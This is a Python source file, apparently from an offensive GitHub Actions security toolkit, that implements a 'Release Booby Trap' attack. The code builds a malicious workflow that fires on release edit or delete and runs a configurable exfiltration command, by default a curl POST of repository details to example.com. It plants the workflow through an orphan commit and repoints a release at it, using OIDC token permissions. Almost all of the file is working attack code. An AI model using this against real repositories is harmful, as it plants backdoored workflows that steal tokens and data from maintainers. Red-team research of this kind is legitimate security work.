import logging
import random
import string

import yaml

from gatox.attack.attack import Attacker
from gatox.cli.output import Output

logger = logging.getLogger(__name__)


class ReleaseBoobyTrapAttack(Attacker):
    """Attack class to plant a Release Booby Trap workflow in a target
    repository via the Git Data API.

    The technique tree-splices a malicious workflow into an orphan commit,
    then creates and repoints a release at that orphan SHA. When a non-bot
    actor interacts with the release (edit, delete), the planted workflow
    fires — bypassing GitHub's loop prevention since the publishing actor
    is GITHUB_TOKEN but the detonation actor is not.

    Reference: https://github.com/Dev11940518/release-bomb-demo
    """

    @staticmethod
    def create_release_booby_trap_yml(
        exfil_sink: str | None = None,
        permissions: dict | None = None,
    ):
        """Create a Release Booby Trap workflow YAML.

        The workflow triggers on ``release: [edited, deleted]`` and executes
        a configurable exfiltration step.

        Args:
            exfil_sink: Shell command to execute when the trap fires.
                Defaults to a benign echo + HTTP POST to example.com.
            permissions: Workflow-level permissions dict. Defaults to
                ``{id-token: write, contents: read}`` for OIDC abuse demo.

        Returns:
            str: Workflow YAML content.
        """
        if permissions is None:
            permissions = {"id-token": "write", "contents": "read"}

        if exfil_sink is None:
            exfil_sink = (
                'echo "[BOOBY_TRAP] detonated — '
                "release booby trap fired\"\n"
                'curl -s -X POST https://example.com/booby-trap-detonated '
                '-d "repo=${{ github.repository }}&release=${{ github.event.release.tag_name }}" '
                '> /dev/null 2>&1 || true'
            )

        yaml_file = {
            "name": "Release Booby Trap",
            "on": {"release": {"types": ["edited", "deleted"]}},
            "jobs": {
                "fire": {
                    "permissions": permissions,
                    "runs-on": "ubuntu-latest",
                    "steps": [{"run": exfil_sink}],
                }
            },
        }

        return yaml.dump(yaml_file, sort_keys=False, default_style="", width=4096)

    @staticmethod
    def load_payload_from_file(payload_path: str) -> str:
        """Load a custom payload YAML from a file path.

        Args:
            payload_path: Path to a YAML workflow file.

        Returns:
            str: File contents as a string.

        Raises:
            FileNotFoundError: If the file does not exist.
        """
        with open(payload_path, "r") as f:
            return f.read()

    async def plant_release_booby_trap(
        self,
        target_repo: str,
        payload_path: str | None = None,
        exfil_sink: str | None = None,
        permissions: dict | None = None,
        publish: bool = False,
        dry_run: bool = False,
    ):
        """Plant a Release Booby Trap in the target repository.

        The attack flow:
        1. Create a blob with the malicious workflow content.
        2. Create a tree pointing the blob at ``.github/workflows/<rand>.yml``.
        3. Create an orphan commit (no parents) with that tree.
        4. Create a draft release with ``target_commitish=main``.
        5. PATCH the release to repoint at the orphan SHA.
        6. Optionally publish the release.

        Args:
            target_repo: Repository in ``owner/repo`` format.
            payload_path: Path to a custom workflow YAML file. If None,
                the built-in template is used.
            exfil_sink: Shell command for the built-in template's trap
                step. Only used when ``payload_path`` is None.
            permissions: Permissions dict for the built-in template.
                Only used when ``payload_path`` is None.
            publish: If True, publish the release (set draft=false).
                Defaults to False (leaves it as draft).
            dry_run: If True, print API calls without making them.

        Returns:
            dict: ``{orphan_sha, release_id, release_url}`` on success,
            None on failure.
        """
        await self.setup_user_info()

        if not self.user_perms:
            return None

        if not dry_run and (
            "repo" not in self.user_perms.get("scopes", [])
            and "workflow" not in self.user_perms.get("scopes", [])
        ):
            Output.error(
                "The user does not have the necessary scopes"
                " to conduct this attack!"
            )
            return None

        # Determine payload contents
        if payload_path:
            workflow_content = self.load_payload_from_file(payload_path)
        else:
            workflow_content = self.create_release_booby_trap_yml(
                exfil_sink=exfil_sink,
                permissions=permissions,
            )

        # Random workflow name to avoid collisions
        rand_suffix = "".join(random.choices(string.ascii_lowercase, k=6))
        workflow_filename = f"booby-trap-{rand_suffix}.yml"

        Output.info(
            f"Planting Release Booby Trap in {Output.bright(target_repo)}"
        )
        if dry_run:
            Output.warn("DRY RUN — no API calls will be made.")

        # ---- Step 1: Create blob ----
        if dry_run:
            Output.tabbed(
                f"[DRY RUN] POST /repos/{target_repo}/git/blobs"
                f" with workflow content"
            )
            blob_sha = "dry-run-blob-sha"
        else:
            blob_resp = await self.api.call_post(
                f"/repos/{target_repo}/git/blobs",
                params={
                    "content": workflow_content,
                    "encoding": "utf-8",
                },
            )
            if blob_resp.status_code != 201:
                Output.error(
                    f"Failed to create blob: {blob_resp.status_code}"
                )
                return None
            blob_sha = blob_resp.json()["sha"]
            Output.tabbed(f"Created blob: {blob_sha[:7]}")

        # ---- Step 2: Create tree ----
        tree_entry = {
            "path": f".github/workflows/{workflow_filename}",
            "mode": "100644",
            "type": "blob",
            "sha": blob_sha,
        }
        if dry_run:
            Output.tabbed(
                f"[DRY RUN] POST /repos/{target_repo}/git/trees"
                f" with {workflow_filename}"
            )
            tree_sha = "dry-run-tree-sha"
        else:
            tree_resp = await self.api.call_post(
                f"/repos/{target_repo}/git/trees",
                params={"tree": [tree_entry]},
            )
            if tree_resp.status_code != 201:
                Output.error(
                    f"Failed to create tree: {tree_resp.status_code}"
                )
                return None
            tree_sha = tree_resp.json()["sha"]
            Output.tabbed(f"Created tree: {tree_sha[:7]}")

        # ---- Step 3: Create orphan commit (no parents) ----
        commit_message = f"booby-trap-plant-{rand_suffix}"
        author_name = self.author_name or "Gato-X"
        author_email = self.author_email or "gato-x@pwn.com"

        if dry_run:
            Output.tabbed(
                f"[DRY RUN] POST /repos/{target_repo}/git/commits"
                f" (orphan, author={author_name})"
            )
            orphan_sha = "dry-run-orphan-sha"
        else:
            commit_params = {
                "message": commit_message,
                "tree": tree_sha,
                "parents": [],
                "author": {
                    "name": author_name,
                    "email": author_email,
                },
            }
            commit_resp = await self.api.call_post(
                f"/repos/{target_repo}/git/commits",
                params=commit_params,
            )
            if commit_resp.status_code != 201:
                Output.error(
                    f"Failed to create orphan commit:"
                    f" {commit_resp.status_code}"
                )
                return None
            orphan_sha = commit_resp.json()["sha"]
            Output.tabbed(f"Created orphan commit: {orphan_sha[:7]}")

        # ---- Step 4: Create draft release pointing at main ----
        tag_name = f"booby-trap-{rand_suffix}"
        release_name = "Malicious Release — Delete me!"

        if dry_run:
            Output.tabbed(
                f"[DRY RUN] POST /repos/{target_repo}/releases"
                f" (draft, target_commitish=main)"
            )
            release_id = 0
            release_url = (
                f"https://github.com/{target_repo}/releases/tag/{tag_name}"
            )
        else:
            release_params = {
                "tag_name": tag_name,
                "name": release_name,
                "target_commitish": "main",
                "draft": True,
            }
            release_resp = await self.api.call_post(
                f"/repos/{target_repo}/releases",
                params=release_params,
            )
            if release_resp.status_code != 201:
                Output.error(
                    f"Failed to create draft release:"
                    f" {release_resp.status_code}"
                )
                return None
            release_data = release_resp.json()
            release_id = release_data["id"]
            release_url = release_data["html_url"]
            Output.tabbed(f"Created draft release: {release_url}")

        # ---- Step 5: PATCH release to repoint at orphan SHA ----
        if dry_run:
            Output.tabbed(
                f"[DRY RUN] PATCH /repos/{target_repo}/releases/{release_id}"
                f" target_commitish={orphan_sha[:7]}"
            )
        else:
            patch_params = {"target_commitish": orphan_sha}
            if publish:
                patch_params["draft"] = False

            patch_resp = await self.api.call_patch(
                f"/repos/{target_repo}/releases/{release_id}",
                params=patch_params,
            )
            if patch_resp.status_code != 200:
                Output.error(
                    f"Failed to PATCH release: {patch_resp.status_code}."
                    f" Cleaning up draft release {release_id}."
                )
                # Idempotent failure: clean up partial state
                await self.api.call_delete(
                    f"/repos/{target_repo}/releases/{release_id}"
                )
                return None
            Output.tabbed(
                f"Repointed release {release_id} at orphan"
                f" {orphan_sha[:7]}"
            )

        # ---- Summary ----
        Output.result("Release Booby Trap planted successfully!")
        Output.tabbed(f"Orphan SHA: {Output.bright(orphan_sha)}")
        Output.tabbed(f"Release URL: {Output.bright(release_url)}")
        Output.tabbed(
            "Trap fires when a non-bot actor edits or deletes the release."
        )
        if not publish:
            Output.tabbed(
                "Release is still a draft — the trap fires on edit/delete,"
                " not on publish."
            )
        else:
            Output.tabbed(
                "Release published — trap fires when a non-bot actor"
                " edits or deletes it."
            )

        return {
            "orphan_sha": orphan_sha,
            "release_id": release_id,
            "release_url": release_url,
        }
